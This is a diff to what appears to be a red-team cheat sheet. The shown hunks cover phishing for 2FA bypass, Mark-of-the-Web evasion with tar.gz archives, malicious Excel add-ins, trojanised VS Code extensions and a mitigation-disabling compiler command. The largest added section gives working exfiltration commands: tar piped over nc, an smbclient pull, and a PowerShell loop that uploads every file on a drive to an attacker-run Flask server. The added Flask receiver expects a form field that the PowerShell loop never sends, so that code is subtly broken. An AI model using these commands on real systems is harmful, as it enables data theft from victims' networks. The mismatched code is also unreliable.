@@ -6,6 +6,7 @@
 - [Resource Development](#resource-development)  
 - [Initial Access](#initial-access)  
 - [Execution](#execution)  
+- [Defense Evasion](#defense-evasion)  
 - [Command & Control](#command--control)  
 - [Credential Access](#credential-access)  
 - [Lateral Movement](#lateral-movement)  
@@ -54,7 +55,7 @@ smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
   <tr>
     <td><b>Compile C++ with cl.exe</b></td>
     <td>
-      <pre><code>cl.exe /nologo /MT /Ox /W0 /GS- /EHs- /GR- /DNDEBUG /Tp auth_validator.cpp /link kernel32.lib /DYNAMICBASE:NO /NXCOMPAT:NO /OUT:auth_validator.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 /ENTRY:WinMain /NODEFAULTLIB /MERGE:.rdata=.text /MERGE:.pdata=.text /MERGE:.data=.text /HEAP:0x100000,0x100000</code></pre>
+      <pre><code>cl.exe /nologo /MT /Ox /W0 /GS- /EHs- /GR- /DNDEBUG /Tp bubble_sort.cpp /link kernel32.lib /DYNAMICBASE:NO /NXCOMPAT:NO /OUT:bubble_sort.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 /ENTRY:WinMain /NODEFAULTLIB /MERGE:.rdata=.text /MERGE:.pdata=.text /MERGE:.data=.text /HEAP:0x100000,0x100000</code></pre>
       <p><b>Flag Breakdown:</b></p>
       <ul>
         <li><code>/nologo</code>: Suppresses the compiler startup banner for cleaner output.</li>
@@ -130,29 +131,28 @@ smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
     <td>Phishing/Smishing</td>
     <td>
       <a href="https://medium.com/sud0root/mastering-modern-red-teaming-infrastructure-part-7-advanced-phishing-techniques-for-2fa-bypass-85f9adc4dc3b" target="_blank">Medium: Advanced Phishing Techniques for 2FA Bypass</a>,  
-      <a href="https://posts.specterops.io/phish-sticks-hate-the-smell-love-the-taste-f4db9de888f7" target="_blank">SpecterOps: Phish Sticks</a>
-      Most companies don't give all employess second phones, but have them use their personal phone.  
+      MFA becoming more popular and companies usually only give higher-ups phones. This means most employees use their personal phones.
     </td>
     </tr>
-  <tr><td>MOTW bypass</td><td>tar.gz, CVE-2025-31334 - WinRar, CVE-2025-0411 - 7-zip</td></tr>
+  <tr><td>MOTW bypass</td><td>tar.gz bypasses motw and can be extraced with 7-zip. CrowdStrike flags on using tar from windows due to lolbin</td></tr>
   <tr>
     <td>Excel</td>
     <td>
-      <a href="https://github.com/mttaggart/xllrs" target="_blank"> Microsoft blocks macros in documents originating from the internet (email AND web download), XLL (Excel Add-Ins) are dlls loaded by Excel. Still get warning for no signature. Need legitimate code signing certificate to avoid this.</a>
+      <a href="https://github.com/mttaggart/xllrs" target="_blank"> Rust XLL</a>
+      Microsoft blocks macros in documents originating from the internet (email AND web download), XLL (Excel Add-Ins) are dlls loaded by Excel. Still get warning for no signature. Need legitimate code signing certificate to avoid this.
     </td>
     </tr>
     <tr>
     <td>Supply Chain</td>
     <td>
-      <a href="https://github.com/0x-Apollyon/Malicious-VScode-Extension" target="_blank">Dracula VS Code plugin was trojanized previously</a>
+      <a href="https://github.com/0x-Apollyon/Malicious-VScode-Extension" target="_blank">VS Code Plugin </a>
+      I have seen many developers trust and install plugins that come from the Visual Studio code marketplace. <a href="https://www.bleepingcomputer.com/news/security/malicious-vscode-extensions-with-millions-of-installs-discovered/" target="_blank"></a>
     </td>
     </tr>
     <tr>
     <td>WAF</td>
     <td>
-      <a href="https://github.com/botesjuan/Obfuscating-Techniques-WAF-Bypass" target="_blank">Obfuscation Tricks</a>, 
-      <a href="https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/" target="_blank">Path Confusion</a>, 
-      <a href="https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939" target="_blank">URL Encoding</a>
+      <a href="https://github.com/botesjuan/Obfuscating-Techniques-WAF-Bypass" target="_blank">Obfuscation Tricks</a>
     </td>
     </tr>
   <tr>
@@ -258,21 +258,43 @@ smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
 
 ---
 
-## Exfiltration
-
 <table>
   <tr>
-    <td><b>Exfil for Embedded Linux</b></td>
+    <td><b>Exfil via Embedded Linux</b></td>
     <td>
       <pre><code>nc -l -p 1234 | tar xf -
 tar cf - /home/debian | nc 10.10.10.10 1234</code></pre>
     </td>
   </tr>
   <tr>
-    <td><b>Exfil for Windows</b></td>
+    <td><b>Exfil via SMB</b></td>
     <td>
-      <pre><code>smbclient \\\\10.10.10.10\\C$ -p &lt;Port&gt; -N -Tc share.tar
+      <pre><code>smbclient \\\\10.10.10.10\\share -p &lt;Port&gt; -N -Tc share.tar
 tar xf share.tar -C share</code></pre>
+    </td>
+  </tr>
+  <tr>
+    <td><b>Exfil via PowerShell to Flask Upload Server</b></td>
+    <td>
+      <pre><code>$files = Get-ChildItem -Path "S:\" -Recurse -File
+foreach ($file in $files) {
+    $body = [System.IO.File]::ReadAllBytes($file.FullName)
+    Invoke-WebRequest -Uri "http://10.10.10.10/upload" -Method POST -Body $body -Headers @{"Filename" = $file.Name}
+}</code></pre>
+      <p><i>Linux box run:</i></p>
+      <pre><code>pip3 install flask</code></pre>
+      <pre><code># upload_server.py
+from flask import Flask, request
+app = Flask(__name__)
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    f = request.files['file']
+    f.save(f.filename)
+    return 'File uploaded successfully'
+
+app.run(host='0.0.0.0', port=80)</code></pre>
+      <p><i>Run with:</i><br><code>sudo python3 upload_server.py</code></p>
     </td>
   </tr>
 </table>
